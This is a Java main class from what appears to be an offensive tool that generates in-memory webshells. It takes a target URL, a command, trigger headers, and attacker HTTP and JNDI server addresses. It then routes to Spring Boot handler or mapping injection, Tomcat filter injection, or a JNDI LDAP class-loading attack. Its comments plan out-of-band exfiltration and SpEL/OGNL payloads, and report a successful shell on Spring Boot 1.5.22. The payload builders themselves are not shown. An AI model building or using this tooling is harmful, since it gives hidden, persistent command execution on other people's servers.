package com;

import com.generate.Jndi;
import com.generate.PostGenerate;
import com.dto.ClassDto;
import com.generate.GenerateAttack;

import java.util.HashMap;

/*
todo: registerMapping似乎可以传空？！看看是不是版本问题
* todo: tomcat valve websocket
* todo: 体积最小化
* todo: Tomcat、jetty等
* todo: 可选命令执行或其他
    * 仅calc
    * tcp/udp/icmp通网测试

* todo: JNDI unboundid 改造下能接受外带数据
* todo: spel、ongl、ScriptEngineManager 语句构造
* SpringBoot 用 RegisterHandler方式，实测能打进1.5.22的内存马
* */
public class Main {
    public static boolean isDeveloper = true;

    public static void main(String[] args) {



        if (!Usage.parseUserArgs(args)) {
            Usage.printUsage();
            return;
        }
        /*
            url
            commandArg
            header
            headerValue
            serverMode
            encode
        * */
        String mode = Usage.getArg("mode");
        String url = Usage.getArg("url");
        String cmd = Usage.getArg("commandArg");
        String header = Usage.getArg("header");
        String headerValue = Usage.getArg("headerValue");
        String encode = Usage.getArg("encode");
        String httpServerIp = Usage.getArg("httpServerIp");
        Integer httpServerPort = Usage.getArg("httpServerPort") == null ? 0 : Integer.parseInt(Usage.getArg("httpServerPort"));
        String jndiServerIp = Usage.getArg("jndiServerIp");
        Integer jndiServerPort = Usage.getArg("jndiServerPort") == null ? 0 : Integer.parseInt(Usage.getArg("jndiServerPort"));
        String webPath = Usage.getArg("webPath");

        HashMap<String, String> inputArgs = Usage.getArgs();
        ClassDto classDto = null;
        try {
            switch (mode){
                case "SpringBoot.registerHandler":
                    classDto = GenerateAttack.SpringRegisterHandler(url, cmd, header, headerValue);
                    break;
                case "SpringBoot.registerMapping":
                    classDto = GenerateAttack.springRegisterMapping(url, cmd, header, headerValue);
                    break;
                case "Tomcat.6789.Filter":
                    classDto = GenerateAttack.tomcatFilter(url, cmd, header, headerValue, "6789");
                    break;
                case "Tomcat.89.Filter":
                    classDto = GenerateAttack.tomcatFilter(url, cmd, header, headerValue, "89");
                    break;
                case "Jndi.Ldap.URLClassLoader":
                    Jndi.ldapBase(inputArgs);
                    return;
                case "Jetty":
                    break;
                case "WebLogic":
                    break;
                default:
                    System.out.println("[-] Unknown serverMode");
                    Usage.printUsage();
                    break;
            }
            PostGenerate.dispatch(classDto, encode, inputArgs);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}